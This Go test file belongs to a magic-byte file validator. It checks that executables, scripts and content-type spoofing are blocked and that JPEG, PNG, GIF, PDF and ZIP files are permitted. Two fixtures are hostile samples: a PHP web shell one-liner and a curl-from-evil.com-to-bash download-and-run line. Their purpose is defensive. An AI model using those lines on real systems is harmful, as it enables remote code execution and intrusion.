package content_test

import (
	"testing"

	"github.com/aiss/agent/internal/security/content"
)

// ── Dangerous file type detection ─────────────────────────────────────────

func TestMagic_WindowsEXE_Blocked(t *testing.T) {
	// MZ header — Windows PE
	data := []byte{0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00}
	result := content.ValidateMagicBytes(data, "application/octet-stream")
	if !result.ShouldBlock {
		t.Error("Windows EXE should be blocked")
	}
	if !result.IsDangerous {
		t.Error("Windows EXE should be flagged as dangerous")
	}
	if result.DetectedKey != "EXE_WINDOWS" {
		t.Errorf("expected EXE_WINDOWS, got %s", result.DetectedKey)
	}
}

func TestMagic_ELFBinary_Blocked(t *testing.T) {
	data := []byte{0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00}
	result := content.ValidateMagicBytes(data, "application/octet-stream")
	if !result.ShouldBlock {
		t.Error("ELF binary should be blocked")
	}
	if result.DetectedKey != "ELF_LINUX" {
		t.Errorf("expected ELF_LINUX, got %s", result.DetectedKey)
	}
}

func TestMagic_PHPScript_Blocked(t *testing.T) {
	data := []byte("<?php system($_GET['cmd']); ?>")
	result := content.ValidateMagicBytes(data, "text/plain")
	if !result.ShouldBlock {
		t.Error("PHP script should be blocked")
	}
	if !result.IsDangerous {
		t.Error("PHP script should be dangerous")
	}
}

func TestMagic_ShellScript_Blocked(t *testing.T) {
	data := []byte("#!/bin/bash\ncurl http://evil.com/shell.sh | bash")
	result := content.ValidateMagicBytes(data, "text/plain")
	if !result.ShouldBlock {
		t.Error("shell script shebang should be blocked")
	}
}

func TestMagic_JavaClass_Blocked(t *testing.T) {
	// CAFEBABE — Java class file
	data := []byte{0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34}
	result := content.ValidateMagicBytes(data, "application/octet-stream")
	if !result.ShouldBlock {
		t.Error("Java class file should be blocked")
	}
	if result.DetectedKey != "JAVA_CLASS" {
		t.Errorf("expected JAVA_CLASS, got %s", result.DetectedKey)
	}
}

func TestMagic_MachO_Blocked(t *testing.T) {
	data := []byte{0xCE, 0xFA, 0xED, 0xFE, 0x07, 0x00, 0x00, 0x00}
	result := content.ValidateMagicBytes(data, "application/octet-stream")
	if !result.ShouldBlock {
		t.Error("macOS Mach-O binary should be blocked")
	}
}

// ── Content-Type spoofing detection ──────────────────────────────────────

func TestMagic_EXEMaskedAsJPEG_Blocked(t *testing.T) {
	// EXE header but declared as JPEG
	data := []byte{0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00}
	result := content.ValidateMagicBytes(data, "image/jpeg")
	if !result.ShouldBlock {
		t.Error("EXE file disguised as JPEG should be blocked")
	}
}

func TestMagic_ELFMaskedAsPNG_Blocked(t *testing.T) {
	data := []byte{0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01}
	result := content.ValidateMagicBytes(data, "image/png")
	if !result.ShouldBlock {
		t.Error("ELF binary disguised as PNG should be blocked")
	}
}

func TestMagic_ZIPDeclaredAsPDF_Blocked(t *testing.T) {
	// ZIP file declared as PDF
	data := []byte{0x50, 0x4B, 0x03, 0x04, 0x14, 0x00}
	result := content.ValidateMagicBytes(data, "application/pdf")
	if !result.ShouldBlock {
		t.Error("ZIP file disguised as PDF should be blocked (Content-Type spoofing)")
	}
	if !result.IsSpoofed {
		t.Error("IsSpoofed should be true for ZIP declared as PDF")
	}
}

// ── Legitimate files ──────────────────────────────────────────────────────

func TestMagic_JPEG_Permitted(t *testing.T) {
	// JPEG magic bytes
	data := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46}
	result := content.ValidateMagicBytes(data, "image/jpeg")
	if result.ShouldBlock {
		t.Errorf("legitimate JPEG should not be blocked: %s", result.Reason)
	}
	if result.IsSpoofed {
		t.Error("legitimate JPEG should not be flagged as spoofed")
	}
}

func TestMagic_PNG_Permitted(t *testing.T) {
	data := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00}
	result := content.ValidateMagicBytes(data, "image/png")
	if result.ShouldBlock {
		t.Errorf("legitimate PNG should not be blocked: %s", result.Reason)
	}
}

func TestMagic_GIF_Permitted(t *testing.T) {
	// GIF89a
	data := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00}
	result := content.ValidateMagicBytes(data, "image/gif")
	if result.ShouldBlock {
		t.Errorf("legitimate GIF should not be blocked: %s", result.Reason)
	}
}

func TestMagic_PDF_Permitted(t *testing.T) {
	data := []byte{0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34}
	result := content.ValidateMagicBytes(data, "application/pdf")
	if result.ShouldBlock {
		t.Errorf("legitimate PDF should not be blocked: %s", result.Reason)
	}
}

func TestMagic_ZIP_PermittedAsZIP(t *testing.T) {
	data := []byte{0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00}
	result := content.ValidateMagicBytes(data, "application/zip")
	if result.ShouldBlock {
		t.Errorf("legitimate ZIP should not be blocked: %s", result.Reason)
	}
}

// ── Edge cases ────────────────────────────────────────────────────────────

func TestMagic_EmptyData(t *testing.T) {
	result := content.ValidateMagicBytes([]byte{}, "application/octet-stream")
	if result.ShouldBlock {
		t.Error("empty data should not be blocked")
	}
}

func TestMagic_ShortData(t *testing.T) {
	result := content.ValidateMagicBytes([]byte{0x4D}, "application/octet-stream")
	if result.ShouldBlock {
		t.Error("single byte should not be blocked (insufficient for magic detection)")
	}
}

func TestMagic_UnknownType_NoBlock(t *testing.T) {
	// Plain text data
	data := []byte("Hello, this is just plain text content without any magic bytes.")
	result := content.ValidateMagicBytes(data, "text/plain")
	if result.ShouldBlock {
		t.Errorf("plain text without dangerous magic bytes should not be blocked: %s", result.Reason)
	}
}

func TestMagic_ReasonPopulated_OnBlock(t *testing.T) {
	data := []byte{0x4D, 0x5A, 0x90, 0x00}
	result := content.ValidateMagicBytes(data, "application/octet-stream")
	if result.ShouldBlock && result.Reason == "" {
		t.Error("blocking result should include a Reason")
	}
}

// ── Benchmarks ────────────────────────────────────────────────────────────

func BenchmarkValidateMagicBytes_JPEG(b *testing.B) {
	data := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01}
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		content.ValidateMagicBytes(data, "image/jpeg")
	}
}

func BenchmarkValidateMagicBytes_EXE(b *testing.B) {
	data := []byte{0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00}
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		content.ValidateMagicBytes(data, "application/octet-stream")
	}
}
